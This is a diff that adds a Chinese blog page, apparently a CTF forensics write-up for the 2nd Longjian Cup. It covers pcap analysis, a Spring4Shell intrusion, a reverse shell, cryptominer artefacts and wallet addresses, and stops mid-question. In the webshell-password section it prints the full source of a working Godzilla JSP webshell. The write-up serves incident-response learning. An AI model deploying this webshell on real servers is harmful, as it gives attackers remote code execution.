@@ -1,0 +1,871 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第二届陇剑杯初赛学习WP | yyssh's blog</title><meta name="author" content="yyssh"><meta name="copyright" content="yyssh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="个人对第二届陇剑杯的复现学习WP笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届陇剑杯初赛学习WP">
+<meta property="og:url" content="https://0xyyssh.github.io/posts/8dc02fc6.html">
+<meta property="og:site_name" content="yyssh&#39;s blog">
+<meta property="og:description" content="个人对第二届陇剑杯的复现学习WP笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0xyyssh.github.io/coverimages/default_bg19.jpg">
+<meta property="article:published_time" content="2025-09-04T10:24:24.000Z">
+<meta property="article:modified_time" content="2026-01-18T17:12:07.962Z">
+<meta property="article:author" content="yyssh">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0xyyssh.github.io/coverimages/default_bg19.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第二届陇剑杯初赛学习WP",
+  "url": "https://0xyyssh.github.io/posts/8dc02fc6.html",
+  "image": "https://0xyyssh.github.io/coverimages/default_bg19.jpg",
+  "datePublished": "2025-09-04T10:24:24.000Z",
+  "dateModified": "2026-01-18T17:12:07.962Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "yyssh",
+      "url": "https://0xyyssh.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/firewall.png"><link rel="canonical" href="https://0xyyssh.github.io/posts/8dc02fc6.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第二届陇剑杯初赛学习WP',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/layout.css"><link rel="stylesheet" href="/css/index_layout.css"><link rel="stylesheet" href="/css/footer.css"><link rel="stylesheet" href="/css/swiper.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/css/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper-lyx/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="loading_img"></div></div></div><script>window.paceOptions = {
+  restartOnPushState: false
+}
+</script><link rel="stylesheet" href="/css/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  //- pace进度条结束后再关闭loading
+  Pace.on('done', preloader.endLoading)
+
+  btf.addGlobalFn('pjaxSend', () => {
+      Pace.restart()
+      if (false){
+          preloader.initLoading()
+      }
+  }, 'pace_restart')
+})()</script><div class="bg-animation" id="web_bg" style="background-color: #FCFCF7;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 上朝听政</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 史记存档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 翰林书院</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-bookmark"></i><span> 御赐黄签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 诸侯会盟</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/coverimages/default_bg19.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">yyssh's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">第二届陇剑杯初赛学习WP</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 上朝听政</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 史记存档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 翰林书院</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-bookmark"></i><span> 御赐黄签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 诸侯会盟</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第二届陇剑杯初赛学习WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-04T10:24:24.000Z" title="发表于 2025-09-04 18:24:24">2025-09-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-18T17:12:07.962Z" title="更新于 2026-01-19 01:12:07">2026-01-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第二届陇剑杯初赛学习WP"><a href="#第二届陇剑杯初赛学习WP" class="headerlink" title="第二届陇剑杯初赛学习WP"></a>第二届陇剑杯初赛学习WP</h1><h2 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h2><h3 id="题目1开放端口："><a href="#题目1开放端口：" class="headerlink" title="题目1开放端口："></a>题目1开放端口：</h3><blockquote>
+<p>服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)</p>
+</blockquote>
+<ul>
+<li><p>首先确定哪一个ip为服务器ip</p>
+<ul>
+<li><p>服务器ip具有一下特征</p>
+<ul>
+<li>打开 <strong>会话列表</strong>，按字节数排序，找到流量最大的IP对。大概率包含服务器。</li>
+<li>对流量最大的IP对应用 <strong>端口过滤器</strong>（如<code>tcp.port == 80</code>），确认服务器身份。</li>
+<li>回到会话列表，按<strong>数据包数量</strong>排序，找到包数量异常多但数据量可能不大的IP，它很可能是攻击者。</li>
+<li>对该可疑IP的通信 <strong>Follow TCP Stream</strong>，查看内容确认是否为攻击行为。</li>
+<li>必要时使用 <strong>错误过滤器</strong>（<code>http.response.code &gt;= 400</code>）辅助验证。</li>
+</ul>
+</li>
+<li><p>这里我们直接使用端口过滤<code>tcp.port == 80</code></p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831114928920.png" alt="image-20250831114928920"></p>
+</li>
+<li><p>可以看到服务器的ip应该为192.168.162.180</p>
+</li>
+<li><p>当服务器对应的端口打开时，会进行三次握手阶段</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831121645177.png" alt="image-20250831121645177"></p>
+</li>
+<li><p>所以我们知道服务器监听一个端口的时候会给客户端返回一个 <code>SYN=1,ACK=1</code>的包，筛选这个流量即可</p>
+</li>
+<li><p><img src="/posts/8dc02fc6/images/image-20250831122214851.png" alt="image-20250831122214851"></p>
+</li>
+<li><p>这里我们也知道了客户端的ip为192.168.162.188，开放的端口为80，888，8888</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>即flag为80,888,8888</p>
+<h3 id="题目2服务器根目录中的flag"><a href="#题目2服务器根目录中的flag" class="headerlink" title="题目2服务器根目录中的flag"></a>题目2服务器根目录中的flag</h3><p>题目:</p>
+<blockquote>
+<p>找到服务器中根目录中的flag</p>
+</blockquote>
+<ul>
+<li><p>通过上一道题我们已经知道了服务器的ip为192.168.162.180，那我们直接筛选该ip的http协议</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831151628436.png" alt="image-20250831151628436"></p>
+</li>
+<li><p>通过前面的http流量也可以分辨出，该客户端先进行了网站目录扫描</p>
+</li>
+<li><p>找到响应码返回200的，追踪http流量进行查看</p>
+  <img src ="images/image-20250831152234839.png" alt="image-20250831152234839" style="zoom:50%;" />
+</li>
+<li><p>可以看到命令执行成功回显，接着查看流量，可以发现shell.jsp</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831152354807.png" alt="image-20250831152354807"></p>
+</li>
+<li><p>查看流量，可以查看到木马的主体</p>
+<ul>
+<li><p><img src="/posts/8dc02fc6/images/image-20250831152509021.png" alt="image-20250831152509021"></p>
+</li>
+<li><p>这是哥斯拉的jsp木马，采用的aes加密，(直接丢给ai也能分析)</p>
+  <img src ="images/image-20250831153533690.png" alt="image-20250831153533690" style="zoom: 33%;" />
+</li>
+<li><p>定位到最后一个流量通信，导出为hexStream</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831154551420.png" alt="image-20250831154551420"></p>
+</li>
+<li><p>用cyberchef解密，哥斯拉的jsp木马采用aes的ECB加密</p>
+</li>
+<li><p>请求：<img src="/posts/8dc02fc6/images/image-20250831155139054.png" alt="image-20250831155139054"></p>
+</li>
+<li><p>响应：<img src="/posts/8dc02fc6/images/image-20250831155242965.png" alt="image-20250831155242965"></p>
+<p>  成功拿到flag</p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>flag{9236b29d-5488-41e6-a04b-53b0d8276542}</p>
+</blockquote>
+<h3 id="题目3webshell密码"><a href="#题目3webshell密码" class="headerlink" title="题目3webshell密码"></a>题目3webshell密码</h3><p>题目：</p>
+<blockquote>
+<p>该webshell的连接密码是多少？</p>
+</blockquote>
+<ul>
+<li><p>回到之前拿到的shell主体</p>
+</li>
+<li><pre><code class="language-jsp">  &lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;
+</code></pre>
+</li>
+<li><p>分析一下代码即可拿到加密密码<code>748007e861908c03</code></p>
+</li>
+<li><p><img src="/posts/8dc02fc6/images/image-20250831160604521.png" alt="image-20250831160604521"></p>
+</li>
+<li><p>解密一下即可拿到webshell的密码</p>
+</li>
+</ul>
+<blockquote>
+<p>14mk3y</p>
+</blockquote>
+<h2 id="Server-save"><a href="#Server-save" class="headerlink" title="Server_save"></a>Server_save</h2><h3 id="题目1黑客使用什么漏洞拿下root权限的"><a href="#题目1黑客使用什么漏洞拿下root权限的" class="headerlink" title="题目1黑客使用什么漏洞拿下root权限的"></a>题目1黑客使用什么漏洞拿下root权限的</h3><p>题目：</p>
+<blockquote>
+<p>黑客使用什么漏洞拿下root权限的</p>
+</blockquote>
+<ul>
+<li><p>首先打开final的pcap包看一下</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831163747432.png" alt="image-20250831163747432"></p>
+</li>
+<li><p>发现大量基于helloworld的目录扫描请求，那就往下滑，锁定到了第一次开始响应200的流量</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831163905539.png" alt="image-20250831163905539"></p>
+</li>
+<li><p>追踪http流量看一眼</p>
+  <img src="images/image-20250831163935522.png" alt="image-20250831163935522" style="zoom:50%;" />
+</li>
+<li><p>这里直接网上搜流量特征<code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_</code>和spring有关的CVE，或者直接丢给ai，马上出结果</p>
+  <img src ="images/image-20250831164109246.png" alt="image-20250831164109246" style="zoom:50%;" />
+</li>
+<li><p>成功拿到CVE编号</p>
+</li>
+</ul>
+<blockquote>
+<p>CVE-2022-22965</p>
+</blockquote>
+<h3 id="题目2黑客反弹shell的ip和端口"><a href="#题目2黑客反弹shell的ip和端口" class="headerlink" title="题目2黑客反弹shell的ip和端口"></a>题目2黑客反弹shell的ip和端口</h3><p>题目：</p>
+<blockquote>
+<p>黑客反弹shell的ip和端口是什么？</p>
+</blockquote>
+<p>接着上面往下看，可以发现他下载了一个可执行脚本，猜测是反弹shell程序</p>
+<p><img src="/posts/8dc02fc6/images/image-20250831165255905.png" alt="image-20250831165255905"></p>
+<p>追踪http数据看一眼</p>
+<img src ="images/image-20250831165316882.png" alt="image-20250831165316882" style="zoom:50%;" />
+
+<p>可以看到这是一个bash的反弹shell，(后面还用python做了一个伪终端)成功拿到反弹shell的ip和端口</p>
+<blockquote>
+<p>ip:195.168.43.128</p>
+<p>port:2333</p>
+</blockquote>
+<h3 id="题目3黑客的病毒名"><a href="#题目3黑客的病毒名" class="headerlink" title="题目3黑客的病毒名"></a>题目3黑客的病毒名</h3><p>题目：</p>
+<blockquote>
+<p>黑客的病毒名称是什么？</p>
+</blockquote>
+<ul>
+<li><p>首先解压do.tar,还原用户的目录(不如palu杯给一个vmware镜像)</p>
+</li>
+<li><p>检查必要流程，history、passwd、log，先看root的history</p>
+  <img src ="images/image-20250831172610488.png" alt="image-20250831172610488" style="zoom:50%;" />
+</li>
+<li><p>什么都没有，再看passwd</p>
+  <img src ="images/image-20250831172828535.png" alt="image-20250831172828535" style="zoom:50%;" />
+</li>
+<li><p>这就明显不对劲了，有两个非root用户，但是拥有root权限，去home目录下查看这两人的目录</p>
+</li>
+<li><p>home目录下面只有guest，那就先查看guest，发现guest下面有一个main程序，还有隐藏文件夹，打开看看</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250831173057607.png" alt="image-20250831173057607"></p>
+</li>
+<li><p>熟悉挖矿的就不用多说了，挖矿程序大多都以Miner结尾，都丢给微步看一下</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/a489f8074a81b732c4f09e6e1e0ba7a89186a878d1c8b55056018fd383217cae?sign=history&env=ubuntu_1704_x64">mian样本报告-微步在线云沙箱</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/624678687937ebdfbbd382b0c9fd56a916e1e2dbb3d939b9ce5a2a4d1d56e02e?sign=history&env=ubuntu_1704_x64">sh执行文件样本报告-微步在线云沙箱</a></p>
+  <img src ="images/image-20250831173330729.png" alt="image-20250831173330729" style="zoom:50%;" />
+
+  <img src ="images/image-20250831173349691.png" alt="image-20250831173349691" style="zoom:50%;" />
+</li>
+<li><p>成功拿到病毒名</p>
+</li>
+</ul>
+<blockquote>
+<p>main</p>
+</blockquote>
+<h3 id="题目4黑客创建了什么用户"><a href="#题目4黑客创建了什么用户" class="headerlink" title="题目4黑客创建了什么用户"></a>题目4黑客创建了什么用户</h3><p>题目：</p>
+<blockquote>
+<p>黑客的病毒运行之后创建了什么用户</p>
+</blockquote>
+<ul>
+<li><p>那还是回到我们上一题的passwd文件查看，可以看到是有两个可疑用户的，接着我们去shadow文件查看加密密码</p>
+  <img src ="images/image-20250831173932775.png" alt="image-20250831173932775" style="zoom:50%;" />
+</li>
+<li><p>直接拿到ll的密码123456，这个能出明文也是6，估计是赛方直接修改shadow文件的</p>
+</li>
+</ul>
+<blockquote>
+<p>123456</p>
+</blockquote>
+<h3 id="题目5服务器在被入侵时外网ip"><a href="#题目5服务器在被入侵时外网ip" class="headerlink" title="题目5服务器在被入侵时外网ip"></a>题目5服务器在被入侵时外网ip</h3><p>题目：</p>
+<blockquote>
+<p>服务器在被入侵时外网ip是多少？</p>
+</blockquote>
+<p>按照思路来，history、passwd、后面紧跟着就是log了</p>
+<p>guest目录下的.log文件</p>
+<img src ="images/image-20250831174920532.png" alt="image-20250831174920532" style="zoom:50%;" />
+
+<p>成功拿到ip</p>
+<blockquote>
+<p>172.105.202.239</p>
+</blockquote>
+<h3 id="题目6病毒运行之后释放文件"><a href="#题目6病毒运行之后释放文件" class="headerlink" title="题目6病毒运行之后释放文件"></a>题目6病毒运行之后释放文件</h3><p>题目：</p>
+<blockquote>
+<p>病毒运行之后释放了什么文件</p>
+</blockquote>
+<p>直接看微步的分析报告<a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/a489f8074a81b732c4f09e6e1e0ba7a89186a878d1c8b55056018fd383217cae?sign=history&env=ubuntu_1704_x64">mian样本报告-微步在线云沙箱</a></p>
+<p>可以知道释放了.idea隐藏目录下的两个文件</p>
+<img src ="images/image-20250831175147129.png" alt="image-20250831175147129" style="zoom:50%;" />
+
+<blockquote>
+<p>lolMiner miner_doge.sh</p>
+</blockquote>
+<h3 id="题目7矿池地址"><a href="#题目7矿池地址" class="headerlink" title="题目7矿池地址"></a>题目7矿池地址</h3><p>题目：</p>
+<blockquote>
+<p>矿池地址是什么</p>
+</blockquote>
+<p>查看sh的执行文件</p>
+<img src ="images/image-20250831175311225.png" alt="image-20250831175311225" style="zoom:50%;" />
+
+<p>成功拿到矿池地址</p>
+<blockquote>
+<p>doge.millpools.cc:5567</p>
+</blockquote>
+<h3 id="题目8黑客的钱包地址"><a href="#题目8黑客的钱包地址" class="headerlink" title="题目8黑客的钱包地址"></a>题目8黑客的钱包地址</h3><p>题目：</p>
+<blockquote>
+<p>黑客的钱包地址</p>
+</blockquote>
+<p>还是上面那个图，wallet就是钱包地址</p>
+<blockquote>
+<p>DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</p>
+</blockquote>
+<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><h3 id="题目1被入侵的主机ip"><a href="#题目1被入侵的主机ip" class="headerlink" title="题目1被入侵的主机ip"></a>题目1被入侵的主机ip</h3><p>题目：</p>
+<blockquote>
+<p>被入侵的主机ip是？</p>
+</blockquote>
+<p>telnet协议传输数据，这里就两个ip，192.168.246.28是服务端，192.168.246.1是客户端</p>
+<p>所以被入侵的就是服务端</p>
+<blockquote>
+<p>192.168.246.28</p>
+</blockquote>
+<h3 id="题目2被入侵的主机口令"><a href="#题目2被入侵的主机口令" class="headerlink" title="题目2被入侵的主机口令"></a>题目2被入侵的主机口令</h3><p>题目：</p>
+<blockquote>
+<p>被入侵的主机口令是？</p>
+</blockquote>
+<p>追踪数据流看一下</p>
+<img src ="images/image-20250831181150409.png" alt="image-20250831181150409" style="zoom:50%;" />
+
+<p>成功拿到password</p>
+<blockquote>
+<p>youcannevergetthis</p>
+</blockquote>
+<h3 id="题目3用户目录下第二个文件夹名"><a href="#题目3用户目录下第二个文件夹名" class="headerlink" title="题目3用户目录下第二个文件夹名"></a>题目3用户目录下第二个文件夹名</h3><p>题目：</p>
+<blockquote>
+<p>用户目录下第二个文件夹名称是？</p>
+</blockquote>
+<img src ="images/image-20250831181337833.png" alt="image-20250831181337833" style="zoom:50%;" />
+
+<p>还是追踪数据流，可以看到</p>
+<p>第二个文件目录是Downloads</p>
+<blockquote>
+<p>Downloads</p>
+</blockquote>
+<h3 id="题目4-etc-passwd倒数第二个用户名"><a href="#题目4-etc-passwd倒数第二个用户名" class="headerlink" title="题目4&#x2F;etc&#x2F;passwd倒数第二个用户名"></a>题目4&#x2F;etc&#x2F;passwd倒数第二个用户名</h3><p>题目：</p>
+<blockquote>
+<p>&#x2F;etc&#x2F;passwd倒数第二个用户名是什么？</p>
+</blockquote>
+<p>还是追踪数据流</p>
+<img src ="images/image-20250831181603961.png" alt="image-20250831181603961" style="zoom:50%;" />
+
+<p>成功拿到用户名</p>
+<blockquote>
+<p>mysql</p>
+</blockquote>
+<h2 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h2><h3 id="题目1挖矿程序所在路径"><a href="#题目1挖矿程序所在路径" class="headerlink" title="题目1挖矿程序所在路径"></a>题目1挖矿程序所在路径</h3><p>题目：</p>
+<blockquote>
+<p>你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root&#x2F;IncidentResponsePasswd）</p>
+<p>挖矿程序所在路径？</p>
+</blockquote>
+<ul>
+<li><p>首先如果电脑在挖矿的话，cpu是跑满的，所以首先用top看一下cpu</p>
+  <img src ="images/image-20250831182910410.png" alt="image-20250831182910410" style="zoom:50%;" />
+</li>
+<li><p>罕见的没怎么跑，那就依然是三件套，history、passwd、log</p>
+</li>
+<li><p>发现root目录下面有.viminfo文件</p>
+  <img src ="images/image-20250902135927371.png" alt="image-20250902135927371" style="zoom:50%;" />
+</li>
+<li><p>查找以后发现进行多次redis操作</p>
+</li>
+<li><p>查看redis的配置文件，发现有矿池钱包</p>
+  <img src ="images/image-20250902140333035.png" alt="image-20250902140333035" style="zoom:50%;" />
+</li>
+<li><p>把redis的服务程序提交给微步进行分析<a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/20a0864cb7dac55c184bd86e45a6e0acbd4bb19aa29840b824d369de710b6152">样本报告-微步在线云沙箱</a></p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250902141043665.png" alt="image-20250902141043665"></p>
+</li>
+<li><p>成功找到Xminer的挖矿程序</p>
+</li>
+</ul>
+<p>看来是把挖矿程序伪装成了redis</p>
+<blockquote>
+<p>echo -n ‘&#x2F;etc&#x2F;redis&#x2F;redis-server’ | md5sum | cut -d ‘’ -f1</p>
+<p>6f72038a870f05cbf923633066e48881</p>
+</blockquote>
+<h3 id="题目2矿池域名"><a href="#题目2矿池域名" class="headerlink" title="题目2矿池域名"></a>题目2矿池域名</h3><p>题目：</p>
+<blockquote>
+<p>挖矿程序连接的矿池域名是什么？</p>
+</blockquote>
+<p>还是回到redis的配置文件（redis,conf），成功拿到矿池域名</p>
+<blockquote>
+<p>echo -n ‘donate.v2.xmrig.com’ | md5sum | cut -d ‘’ -f1</p>
+<p>3fca20bb92d0ed67714e68704a0a4503</p>
+</blockquote>
+<h3 id="题目3攻击者的利用方式"><a href="#题目3攻击者的利用方式" class="headerlink" title="题目3攻击者的利用方式"></a>题目3攻击者的利用方式</h3><p>题目：</p>
+<blockquote>
+<p>攻击者入侵服务器的利用的方法是什么？</p>
+</blockquote>
+<p>因为根据题目描述公司通过访问恶意域名而被挖矿，来到home&#x2F;app&#x2F;nohup.log下面,直接丢给ai分析这个日志</p>
+<img src ="images/image-20250902144312190.png" alt="image-20250902144312190" style="zoom:50%;" />
+
+<p>成功拿到攻击方式，shiro的反序列化</p>
+<blockquote>
+<p>echo -n ‘shirodeserialization’ | md5sum | cut -d ‘’ -f1</p>
+<p>3ee726cb32f87a15d22fe55fa04c4dcd</p>
+</blockquote>
+<h3 id="题目4攻击者的ip"><a href="#题目4攻击者的ip" class="headerlink" title="题目4攻击者的ip"></a>题目4攻击者的ip</h3><p>题目：</p>
+<blockquote>
+<p>攻击者的ip是什么？</p>
+</blockquote>
+<ul>
+<li><p>首先排查登录日志</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250902150924635.png" alt="image-20250902150924635"></p>
+</li>
+<li><p>成功锁定到了81.70.166.3这个ip</p>
+</li>
+<li><p>然后查看nginx日志</p>
+<p>  <img src="/posts/8dc02fc6/images/image-20250902151200834.png" alt="image-20250902151200834"></p>
+</li>
+<li><p>也是这个ip</p>
+</li>
+</ul>
+<blockquote>
+<p>echo -n ‘81.70.166.3’ | md5sum | cut -d ‘’ -f1</p>
+<p>c76b4b1a5e8c9e7751af4684c6a8b2c9</p>
+</blockquote>
+<h3 id="题目5攻击者发起攻击时的UA"><a href="#题目5攻击者发起攻击时的UA" class="headerlink" title="题目5攻击者发起攻击时的UA"></a>题目5攻击者发起攻击时的UA</h3><p>题目：</p>
+<blockquote>
